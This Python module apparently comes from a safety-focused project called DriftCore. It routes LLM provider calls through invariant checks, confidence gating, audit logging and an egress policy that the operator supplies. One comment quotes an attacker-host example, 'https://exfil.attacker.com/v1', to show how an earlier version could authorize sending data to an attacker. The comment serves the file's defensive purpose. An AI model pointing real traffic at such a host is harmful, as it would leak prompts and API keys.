"""
llm_adapter.py — Safe LLM Integration Layer (v3.2)

═══════════════════════════════════════════════════════════════
PLAIN LANGUAGE — FOR EVERYONE
═══════════════════════════════════════════════════════════════

This is how DriftCore talks to large language models
(Claude, GPT, Grok, local models) — SAFELY.

Every call to an LLM passes through DriftCore's safety stack:

  1. INVARIANT CHECK   — the prompt itself is checked first.
                         Weapons/oversight-removal prompts never
                         even reach the model.
  2. MODE ENFORCEMENT  — the current cognitive mode (Truth /
                         Creative / Discovery) shapes the prompt
                         and the rules applied to the output.
  3. CONFIDENCE        — the model is required to state its
                         confidence; outputs get wrapped in the
                         Bayesian uncertainty layer.
  4. SYCOPHANCY FEED   — every interaction is observed by the
                         sycophancy detector.
  5. AUDIT             — every call and response is recorded in
                         the immutable audit chain.

No raw, unwrapped LLM access exists inside DriftCore.
That is deliberate.

═══════════════════════════════════════════════════════════════
SUPPORTED PROVIDERS
═══════════════════════════════════════════════════════════════

  AnthropicAdapter — Claude models (claude.ai / API)
  OpenAIAdapter    — GPT models
  XAIAdapter       — Grok models
  LocalAdapter     — any OpenAI-compatible local server
                     (Ollama, llama.cpp, vLLM, LM Studio)

API keys are read from environment variables only.
DriftCore never stores keys in code or config files.

═══════════════════════════════════════════════════════════════
"""

import os
import json
from abc import ABC, abstractmethod
from datetime import datetime


# ── Mode-specific system prompts ──────────────────────────────

MODE_SYSTEM_PROMPTS = {
    "TRUTH": (
        "You are operating in TRUTH MODE inside a safety-critical system. "
        "Rules: Only state things you are confident are factually grounded. "
        "If you are not sure, say 'I don't know' — explicit ignorance is "
        "preferred over confident wrongness. Do not speculate. "
        "End your response with a line: CONFIDENCE: <0.0-1.0>"
    ),
    "CREATIVE": (
        "You are operating in CREATIVE MODE inside a safety-aware system. "
        "You are encouraged to make speculative, generative, abductive leaps — "
        "hypotheses, unexpected connections, 'what ifs'. Wrong-but-generative "
        "is welcome. Everything you produce will be labelled SPECULATIVE "
        "before a human sees it. "
        "End your response with a line: CONFIDENCE: <0.0-1.0>"
    ),
    "DISCOVERY": (
        "You are operating in DISCOVERY MODE inside a safety-aware system. "
        "Distinguish clearly between what is KNOWN (grounded), what is "
        "INFERRED (derived), and what is SPECULATIVE (extrapolated). "
        "Label each claim accordingly. "
        "End your response with a line: CONFIDENCE: <0.0-1.0>"
    ),
}


class LLMResponse:
    """A safety-wrapped response from any LLM."""

    def __init__(self, text: str, confidence: float, mode: str,
                 provider: str, model: str, blocked: bool = False,
                 block_reason: str = ""):
        self.text         = text
        self.confidence   = confidence
        self.mode         = mode
        self.provider     = provider
        self.model        = model
        self.blocked      = blocked
        self.block_reason = block_reason
        self.timestamp    = datetime.utcnow().isoformat()

    def to_dict(self) -> dict:
        return {
            "text": self.text, "confidence": self.confidence,
            "mode": self.mode, "provider": self.provider,
            "model": self.model, "blocked": self.blocked,
            "block_reason": self.block_reason, "timestamp": self.timestamp,
        }


class SafeLLMAdapter(ABC):
    """
    Base class for all LLM adapters.
    Subclasses implement _raw_call(). Everything else — invariant
    checks, mode enforcement, confidence extraction, audit — is
    handled here and cannot be skipped by subclasses.
    """

    provider_name = "abstract"

    def __init__(self, mode_controller=None, invariant_guard=None,
                 uncertainty_layer=None, sycophancy_detector=None,
                 audit=None, narrator=None, model: str = "",
                 egress_policy=None):
        self.mode_controller = mode_controller
        self.invariant_guard = invariant_guard
        self.uncertainty     = uncertainty_layer
        self.sycophancy      = sycophancy_detector
        self.audit           = audit
        self.narrator        = narrator
        self.model           = model
        self.call_log        = []
        # Operator-supplied destination authorization. None means this adapter
        # cannot reach the network — refusing is the safe failure.
        self.egress_policy   = egress_policy

    # ── the one door for provider traffic ────────────────────────────
    #
    # Every adapter used to call urllib.request.urlopen directly: four sites,
    # each sending a full JSON body and an API key to an external host, none of
    # them consulting the egress allowlist. They now share this method, so the
    # door is structural rather than repeated in four places where the next
    # adapter would forget it.
    #
    # TRUST DIRECTION — the important part, and it was wrong in the first cut.
    # That version built its own EgressPolicy and appended whatever base URL it
    # had been handed:
    #
    #     if base not in allow: allow.append(base)      # <-- self-authorization
    #
    # which turned "human declares destination, guard verifies it" into "adapter
    # declares destination, guard verifies the adapter's own declaration".
    # `LocalAdapter(base_url="https://exfil.attacker.com/v1")` authorized itself.
    # Red team (ChatGPT, 2026-08) called it authorization confused with
    # configuration, and that is exactly what it was.
    #
    # The adapter now CONSUMES an egress policy it cannot create. It may say "I
    # want to contact X"; only the operator's policy answers whether X is
    # allowed. An adapter with no injected policy cannot reach the network at
    # all — refusing is the safe failure, and a default policy would just be
    # self-authorization with extra steps.
    #
    # WHY THE DESTINATION LAYER AND NOT THE SHAPE LAYER: an LLM prompt IS free
    # text — that is the whole point of the call — and request_schema has no
    # FREE_TEXT type on purpose. Declaring a schema that permits arbitrary prose
    # would look constrained while constraining nothing. So provider calls are
    # gated on WHERE they may go. The body is NOT covered, which means an
    # authorized provider request remains an information-flow channel: see
    # THREAT_MODEL_exfiltration.md. Destination security and information-flow
    # security are different properties and this method only provides the first.

    def _guarded_post(self, url: str, payload: dict, headers: dict,
                      timeout: float = 60.0) -> dict:
        """POST JSON to a provider through an OPERATOR-SUPPLIED egress policy.

        `self.egress_policy` must be set by the caller (constructor kwarg or
        attribute). This method never creates or extends a policy.
        """
        import json as _json
        from driftcore.kernel.egress_guard import (
            EgressGuard, GuardedEgress, EgressRefused,
        )
        from driftcore.kernel.one_door_client import PinnedHTTPTransport

        policy = getattr(self, "egress_policy", None)
        if policy is None:
            raise RuntimeError(
                "no egress policy configured for this adapter. A destination is "
                "authorized by the operator, never by the adapter that wants to "
                "reach it — pass egress_policy=EgressPolicy.build([...], "
                "declared_by=<operator>) when constructing the adapter.")

        guard = EgressGuard(policy)
        egress = GuardedEgress(guard, PinnedHTTPTransport(timeout=timeout))

        body = _json.dumps(payload).encode()
        try:
            status, _resp_headers, data = egress.request(
                url, method="POST", body=body,
                headers={**headers, "content-type": "application/json"})
        except EgressRefused as e:
            raise RuntimeError(
                f"provider call refused by the egress guard: {e}") from None
        if status >= 400:
            raise RuntimeError(f"provider returned HTTP {status}")
        return _json.loads(data)

    # ── The one public entry point ────────────────────────────

    def generate(self, prompt: str, max_tokens: int = 1024) -> LLMResponse:
        mode = (self.mode_controller.mode.value
                if self.mode_controller else "TRUTH")

        # 1. Invariant pre-check on the PROMPT itself
        if self.invariant_guard:
            check = self.invariant_guard.check({"action": "llm_generate",
                                                "prompt": prompt})
            if check.get("status") == "BLOCKED_BY_INVARIANT":
                resp = LLMResponse(
                    text="", confidence=0.0, mode=mode,
                    provider=self.provider_name, model=self.model,
                    blocked=True,
                    block_reason=f"Invariant: {check.get('invariant')}",
                )
                self._record(prompt, resp)
                return resp

        # 2. Mode-enforced system prompt
        system = MODE_SYSTEM_PROMPTS.get(mode, MODE_SYSTEM_PROMPTS["TRUTH"])

        # 3. The actual model call (subclass implements)
        try:
            raw_text = self._raw_call(system, prompt, max_tokens)
        except Exception as e:
            resp = LLMResponse(
                text="", confidence=0.0, mode=mode,
                provider=self.provider_name, model=self.model,
                blocked=True, block_reason=f"Provider error: {e}",
            )
            self._record(prompt, resp)
            return resp

        # 4. Extract confidence; wrap in uncertainty layer
        text, confidence = self._extract_confidence(raw_text)
        if self.uncertainty:
            self.uncertainty.wrap(text[:200], confidence,
                                  source=f"{self.provider_name}:{self.model}")

        # 5. Truth-mode confidence gate
        if mode == "TRUTH" and confidence < 0.70:
            if self.narrator:
                self.narrator.narrate_low_confidence_in_truth_mode(
                    text[:120], confidence)
            resp = LLMResponse(
                text=text, confidence=confidence, mode=mode,
                provider=self.provider_name, model=self.model,
                blocked=True,
                block_reason="TRUTH MODE: confidence below 0.70 threshold",
            )
            self._record(prompt, resp)
            return resp

        resp = LLMResponse(text=text, confidence=confidence, mode=mode,
                           provider=self.provider_name, model=self.model)
        self._record(prompt, resp)
        return resp

    # ── Subclass responsibility ───────────────────────────────

    @abstractmethod
    def _raw_call(self, system: str, prompt: str, max_tokens: int) -> str:
        """Make the actual API call. Return raw text."""
        ...

    # ── Helpers ───────────────────────────────────────────────

    @staticmethod
    def _extract_confidence(raw_text: str) -> tuple[str, float]:
        """Parse trailing 'CONFIDENCE: 0.x' line. Default 0.5 if absent."""
        confidence = 0.5
        lines = raw_text.rstrip().splitlines()
        if lines and "CONFIDENCE:" in lines[-1].upper():
            try:
                confidence = float(
                    lines[-1].upper().split("CONFIDENCE:")[1].strip())
                confidence = min(max(confidence, 0.0), 1.0)
                lines = lines[:-1]
            except (ValueError, IndexError):
                pass
        return "\n".join(lines).strip(), confidence

    def _record(self, prompt: str, resp: LLMResponse):
        entry = {"prompt_preview": prompt[:200], **resp.to_dict()}
        self.call_log.append(entry)
        if self.audit:
            self.audit.record(
                "LLM_CALL_BLOCKED" if resp.blocked else "LLM_CALL",
                (f"LLM call via {self.provider_name} "
                 f"{'BLOCKED: ' + resp.block_reason if resp.blocked else 'completed'} "
                 f"(mode={resp.mode}, confidence={resp.confidence:.2f})"),
                entry,
            )


# ══════════════════════════════════════════════════════════════
# Concrete adapters
# Keys from environment only: ANTHROPIC_API_KEY, OPENAI_API_KEY,
# XAI_API_KEY. Never hardcode keys.
# ══════════════════════════════════════════════════════════════

class AnthropicAdapter(SafeLLMAdapter):
    provider_name = "anthropic"

    def __init__(self, model: str = "claude-sonnet-4-20250514", **kw):
        super().__init__(model=model, **kw)

    def _raw_call(self, system, prompt, max_tokens):
        key = os.environ.get("ANTHROPIC_API_KEY")
        if not key:
            raise RuntimeError("ANTHROPIC_API_KEY not set in environment")
        data = self._guarded_post(
            "https://api.anthropic.com/v1/messages",
            {"model": self.model, "max_tokens": max_tokens,
             "system": system,
             "messages": [{"role": "user", "content": prompt}]},
            {"x-api-key": key, "anthropic-version": "2023-06-01"},
            timeout=60)
        return "".join(b.get("text", "") for b in data.get("content", []))


class OpenAIAdapter(SafeLLMAdapter):
    provider_name = "openai"

    def __init__(self, model: str = "gpt-4o", **kw):
        super().__init__(model=model, **kw)

    def _raw_call(self, system, prompt, max_tokens):
        key = os.environ.get("OPENAI_API_KEY")
        if not key:
            raise RuntimeError("OPENAI_API_KEY not set in environment")
        data = self._guarded_post(
            "https://api.openai.com/v1/chat/completions",
            {"model": self.model, "max_tokens": max_tokens,
             "messages": [{"role": "system", "content": system},
                          {"role": "user", "content": prompt}]},
            {"Authorization": f"Bearer {key}"}, timeout=60)
        return data["choices"][0]["message"]["content"]


class XAIAdapter(OpenAIAdapter):
    """Grok — OpenAI-compatible API at x.ai."""
    provider_name = "xai"

    def __init__(self, model: str = "grok-3", **kw):
        SafeLLMAdapter.__init__(self, model=model, **kw)

    def _raw_call(self, system, prompt, max_tokens):
        key = os.environ.get("XAI_API_KEY")
        if not key:
            raise RuntimeError("XAI_API_KEY not set in environment")
        data = self._guarded_post(
            "https://api.x.ai/v1/chat/completions",
            {"model": self.model, "max_tokens": max_tokens,
             "messages": [{"role": "system", "content": system},
                          {"role": "user", "content": prompt}]},
            {"Authorization": f"Bearer {key}"}, timeout=60)
        return data["choices"][0]["message"]["content"]


class LocalAdapter(OpenAIAdapter):
    """Any OpenAI-compatible local server: Ollama, vLLM, LM Studio."""
    provider_name = "local"

    def __init__(self, model: str = "llama3",
                 base_url: str = "http://localhost:11434/v1", **kw):
        SafeLLMAdapter.__init__(self, model=model, **kw)
        self.base_url = base_url

    def _raw_call(self, system, prompt, max_tokens):
        data = self._guarded_post(
            f"{self.base_url}/chat/completions",
            {"model": self.model, "max_tokens": max_tokens,
             "messages": [{"role": "system", "content": system},
                          {"role": "user", "content": prompt}]},
            {}, timeout=120)
        return data["choices"][0]["message"]["content"]


class MockAdapter(SafeLLMAdapter):
    """For demos and tests — no network, no keys."""
    provider_name = "mock"

    def __init__(self, canned_response: str = "Mock response.",
                 canned_confidence: float = 0.8, **kw):
        super().__init__(model="mock-1", **kw)
        self._canned = canned_response
        self._conf   = canned_confidence

    def _raw_call(self, system, prompt, max_tokens):
        return f"{self._canned}\nCONFIDENCE: {self._conf}"
